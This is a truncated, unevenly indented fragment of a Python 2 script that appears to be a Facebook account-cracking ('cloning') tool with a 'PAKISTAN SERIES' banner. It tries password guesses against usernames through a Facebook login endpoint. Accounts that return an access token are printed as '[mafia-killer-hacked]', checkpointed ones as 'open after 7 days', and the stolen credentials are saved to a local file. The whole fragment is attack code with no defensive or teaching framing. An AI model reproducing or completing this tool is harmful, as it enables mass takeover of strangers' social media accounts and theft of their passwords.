...
def login():
    ...
    jalan ('\033[1;30m═════════════════════════════════════════════════════════════════════════════════════════════')
    time.sleep(0.05)
    jalan ('\033[0;97m◣1◢\x1b[1;96mPAKISTAN\x1b[1;92m SERIES')
    time.sleep(0.05)
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m[mafia-killer-hacked]  ' + k + c + user + '  |  ' + pass1
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;93m[open after 7 days] ' + k + c + user + '  |  ' + pass1
					...
					cpb.append(c+user+pass1)
 				    ...
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m[mafia-killer-hacked]  ' + k + c + user +  '  |  ' + pass2
 				        okb = open('save/cloned.txt', 'a')
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;93m[open after 7 days] ' + k + c + user + '  |  ' + pass2
 					        cps = open('save/cloned.txt', 'a')
